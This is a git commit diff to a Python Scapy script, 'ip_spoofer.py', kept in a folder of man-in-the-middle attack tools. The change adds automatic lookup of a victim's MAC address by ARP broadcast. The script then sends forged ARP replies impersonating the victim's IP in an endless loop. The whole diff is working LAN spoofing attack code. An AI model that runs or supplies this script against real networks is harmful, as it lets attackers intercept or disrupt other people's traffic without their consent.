56f2a523aec632e6e532bfc831aeeaca5b05e3cc
fpacenza <francescopacenza93@gmail.com>
2024-04-19 10:28:31 +0200

    added automatic search of the victim mac_address in ip_spoofer

--- Other MITM Attacks/IP Spoofing/ip_spoofer.py
+++ Other MITM Attacks/IP Spoofing/ip_spoofer.py
@@ -5,7 +5,20 @@ console = Console()
 
 
 BROADCAST = "FF:FF:FF:FF:FF:FF"
-def main(victim_mac: str, victim_ip: str):
+
+def getMAC(ip: str):
+    mac, _ = srp(Ether(dst=BROADCAST)/ARP(pdst=ip), timeout=2, verbose=0)
+    if mac:
+        return mac[0][1].src
+    return None
+
+
+def main(victim_ip: str):
+    victim_mac = getMAC(victim_ip)
+    if not victim_mac:
+        console.print(f"[red]Could not find MAC address for {victim_ip}[/red]")
+        raise typer.Exit()
+
     pkt = Ether(src=victim_mac, dst=BROADCAST)/ARP(op=2, psrc=victim_ip)
     with console.status("Sending Packets..."):
         sendp(pkt, loop=1, inter=0.5)
